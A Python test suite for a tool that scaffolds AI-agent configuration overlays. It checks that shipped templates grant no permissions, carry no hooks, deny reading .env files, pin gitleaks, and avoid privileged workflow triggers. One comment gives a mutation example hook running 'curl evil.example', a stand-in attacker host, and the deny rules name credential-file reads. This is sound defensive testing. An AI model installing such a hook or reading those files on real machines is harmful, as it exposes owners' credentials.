from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from keelline import __version__
from keelline.config.loader import preset_defaults
from keelline.hooks.api import EVENTS
from keelline.overlay.api import OVERLAY_FILES, template_root, templates
from keelline.presets import load_preset


def _json_files() -> list[Path]:
    return sorted(template_root().rglob("*.json"))


def test_the_template_tree_is_reachable_at_all() -> None:
    # The non-vacuity guard, and it is not hypothetical: `rglob` over a directory that is not
    # in the wheel or the sdist returns nothing, and every assertion below then passes by
    # finding no files to fail on. `tests/test_import_boundary.py` carries the same idiom for
    # the same reason.
    assert template_root().is_dir()
    assert _json_files(), "no JSON in templates/overlay — the invariants below are vacuous"


def test_the_template_ships_no_allow_rule_anywhere() -> None:
    # §12: "Overlay template shipping `allow` rules or hooks → a test over templates/overlay/
    # fails the release." The plugin author may never grant a permission (§3, first row); only
    # the machine owner may, by editing their own instance after it is theirs.
    for path in _json_files():
        assert "allow" not in _keys(json.loads(path.read_text(encoding="utf-8"))), path


def test_the_template_ships_no_hook_entry() -> None:
    # Same row. An overlay hook is the machine owner's to add; one shipped in the template
    # would execute on every machine that created an instance from it.
    #
    # The `if "hooks" in payload` guard this replaced was the defect: a file with no `hooks`
    # key was not examined at all, so a hook written under a bare top-level event key —
    # `{"PreToolUse": [...]}`, the shape `.codex/hooks.json` uses — passed. Both spellings are
    # refused now, and the event vocabulary comes from `hooks.api.EVENTS` rather than a second
    # copy of it here, so a sixth event is covered the day it is declared.
    #
    # Mutation: put `{"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command",
    # "command": "curl evil.example"}]}]}` into common/claude/hooks.json -> reddens.
    for path in _json_files():
        payload = json.loads(path.read_text(encoding="utf-8"))
        assert payload.get("hooks", {}) == {}, path
        assert not set(EVENTS) & _keys(payload), path


def test_the_preset_grants_nothing_anywhere_in_it() -> None:
    # The same rule for the other shipped file that can carry permissions. An earlier draft
    # asserted `"allow" not in preset["deny"]` — an allow key nested INSIDE the deny table,
    # which nobody writes. §3 forbids an allow rule anywhere in anything the author ships.
    assert "allow" not in _keys(load_preset("recommended"))


def test_the_template_ignores_env_files() -> None:
    # §6.4: the overlay may hold hostnames, user ids and env-file paths; it never holds
    # credentials. This is the cheap half of that promise; gitleaks is the other half.
    #
    # The patterns, from the non-comment lines, and not `".env" in text`: that substring test
    # was satisfied by the word appearing in the file's own explanatory comment, so commenting
    # every pattern out left it green with nothing ignored at all.
    #
    # Mutation: comment out the `.env` line in templates/overlay/.gitignore -> reddens.
    text = (template_root() / ".gitignore").read_text(encoding="utf-8")
    patterns = {
        stripped for line in text.splitlines() if (stripped := line.strip()) and stripped[0] != "#"
    }
    assert patterns, "an all-comment .gitignore ignores nothing"
    assert {".env", ".env.*"} <= patterns, patterns


# A `rev:` a pre-commit hook may carry: an immutable release tag, or a full commit sha. A
# branch name is neither, and a branch is the whole of what this row exists to refuse.
_PINNED_REV = re.compile(r"\Av\d+\.\d+\.\d+\Z|\A[0-9a-f]{40}\Z")


def test_the_template_pins_gitleaks_at_a_revision() -> None:
    # GitHub does not scan private repositories on a personal plan, so gitleaks is the scan.
    # An unpinned rev is a third party choosing what runs on the owner's machine.
    #
    # The *value* of `rev:`, and not `"rev:" in config`: that membership test is true of every
    # possible pre-commit configuration, including one pinned at `main`, which is exactly the
    # state it is named for refusing.
    #
    # Mutation: `rev: v8.21.2` -> `rev: main` in templates/overlay/.pre-commit-config.yaml
    # -> reddens.
    config = (template_root() / ".pre-commit-config.yaml").read_text(encoding="utf-8")
    assert "gitleaks" in config
    revisions = re.findall(r"^\s*rev:\s*(\S+)\s*$", config, re.MULTILINE)
    assert revisions, "no `rev:` at all, so the hook follows whatever the repo's default branch is"
    for revision in revisions:
        assert _PINNED_REV.match(revision), revision


def test_the_template_denies_reading_env_files() -> None:
    # §3: the plugin author may never grant a permission, and the template's only actual
    # *protection* is this one deny table. Replacing `permissions.json` with `{}` left the
    # whole overlay suite green, because the file was held to `is_file()` and to the absence of
    # an allow rule -- both of which an empty object satisfies.
    #
    # The rules are asserted by value because they are the artifact: a deny list that no longer
    # names `.env` is a machine whose agent may read the credentials §6.4 promises never enter
    # the overlay.
    #
    # Mutation: `{}` into templates/overlay/common/claude/permissions.json -> reddens.
    payload = json.loads(
        (template_root() / "common" / "claude" / "permissions.json").read_text(encoding="utf-8")
    )
    assert payload["permissions"]["deny"] == ["Read(.env*)", "Read(**/.env*)"]


# The `permissions:` scopes a workflow may hold, and the trigger it may not. `pull_request_target`
# runs with the base repository's secrets against a fork's head; paired with a write scope it is
# the standard Actions privilege-escalation shape, and this file ships into every overlay a user
# creates. Parsed by line rather than by a YAML reader because the runtime is stdlib-only and
# `tests/test_import_boundary.py` holds the whole tree to it.
_WRITE_SCOPE = re.compile(r"^\s*[a-z-]+:\s*write\s*$", re.MULTILINE)


def test_the_scan_workflow_never_runs_a_forks_head_with_the_repositorys_own_token() -> None:
    # Nothing asserted anything about this file before -- the reviewer rewrote it to
    # `pull_request_target:` with `contents: write` and `id-token: write` and all 43 cases
    # passed. Both halves are asserted: the trigger that makes a fork's code privileged, and
    # any write scope, because `contents: read` alone is what a secret scan needs.
    #
    # Mutation: `pull_request:` -> `pull_request_target:`, or `contents: read` ->
    # `contents: write`, in templates/overlay/.github/workflows/scan.yml -> reddens.
    text = (template_root() / ".github" / "workflows" / "scan.yml").read_text(encoding="utf-8")
    triggers = re.findall(r"^  ([a-z_]+):", text, re.MULTILINE)
    assert triggers, "no trigger block was found, so the assertion below measures nothing"
    assert "pull_request_target" not in triggers, triggers
    assert re.search(r"^permissions:\n  contents: read\n", text, re.MULTILINE), text
    assert _WRITE_SCOPE.search(text) is None, _WRITE_SCOPE.search(text)


@pytest.mark.parametrize("relative", sorted(OVERLAY_FILES))
def test_every_declared_file_exists(relative: str) -> None:
    # The list and the tree are two statements of one thing, and they drift. Asserting from the
    # list catches a deleted file; the next test catches an undeclared one.
    assert (template_root() / relative).is_file()


def test_no_file_in_the_tree_is_undeclared() -> None:
    root = template_root()
    present = {str(p.relative_to(root)) for p in root.rglob("*") if p.is_file()}
    assert present == set(OVERLAY_FILES)


def test_the_templates_plan_cleanly_into_an_empty_directory(tmp_path: Path) -> None:
    from keelline.scaffold import apply, plan

    # The overlay writes through C2 like every other lane, which is what makes `overlay
    # upgrade` the engine's hash-and-skip rule rather than a second implementation of it.
    planned = plan(tmp_path, preset_defaults("keelline-private"), templates())
    assert planned.refusals == ()
    assert len(planned.actions) == len(OVERLAY_FILES)
    apply(tmp_path, planned)
    assert (tmp_path / ".keelline" / "manifest.json").is_file()


def test_the_manifest_records_a_comparable_version(tmp_path: Path) -> None:
    from keelline.scaffold import Manifest, apply, plan

    # `[defaults.keelline]` carries no `version`, and the engine stamps one into every Record.
    # A record written with "" is a record `upgrade` and `doctor` can never compare against.
    apply(tmp_path, plan(tmp_path, preset_defaults("keelline-private"), templates()))
    records = Manifest.read(tmp_path).records
    assert records and {record.version for record in records.values()} == {__version__}


def _keys(value: object) -> set[str]:
    """Every key anywhere in a parsed JSON/TOML document.

    Recursive on purpose: the risk §3 names is an allow rule *anywhere* in a shipped file, and
    a top-level membership test misses `permissions.allow`, which is where one would actually
    be written.
    """
    if isinstance(value, dict):
        return set(value) | {key for item in value.values() for key in _keys(item)}
    if isinstance(value, list):
        return {key for item in value for key in _keys(item)}
    return set()
